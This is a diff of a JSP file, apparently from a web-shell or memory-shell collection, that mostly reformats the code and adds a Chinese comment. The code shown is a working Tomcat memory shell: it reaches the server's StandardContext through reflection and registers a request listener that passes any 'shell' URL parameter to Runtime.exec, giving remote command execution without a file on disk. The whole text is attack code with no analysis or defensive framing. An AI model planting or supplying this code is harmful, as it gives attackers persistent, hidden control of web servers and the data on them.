@@ -12,33 +12,35 @@
 <!-- 2、request any url with a parameter of "shell" -->
 
 <%
-class S implements ServletRequestListener{
-    @Override
-    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
-        
-    }
+    class S implements ServletRequestListener {
+        @Override
+        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
 
-    @Override
-    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
-        if(request.getParameter("shell") != null){
-            try {
-                Runtime.getRuntime().exec(request.getParameter("shell"));
-            } catch (IOException e) {}
+        }
+
+        @Override
+        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
+            if (request.getParameter("shell") != null) {
+                try {
+                    Runtime.getRuntime().exec(request.getParameter("shell"));
+                } catch (IOException e) {
+                }
+            }
         }
     }
-}
 %>
 
 <%
-ServletContext servletContext =  request.getSession().getServletContext();
-Field appctx = servletContext.getClass().getDeclaredField("context");
-appctx.setAccessible(true);
-ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
-Field stdctx = applicationContext.getClass().getDeclaredField("context");
-stdctx.setAccessible(true);
-StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
-out.println("inject success");
-S servletRequestListener = new S();
-//创建能够执行命令的Listener
-standardContext.addApplicationEventListener(servletRequestListener);
+    //动态获取context部分
+    ServletContext servletContext = request.getSession().getServletContext();
+    Field appctx = servletContext.getClass().getDeclaredField("context");
+    appctx.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+    Field stdctx = applicationContext.getClass().getDeclaredField("context");
+    stdctx.setAccessible(true);
+    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+    out.println("inject success");
+    //创建能够执行命令的Listener
+    S servletRequestListener = new S();
+    standardContext.addApplicationEventListener(servletRequestListener);
 %>
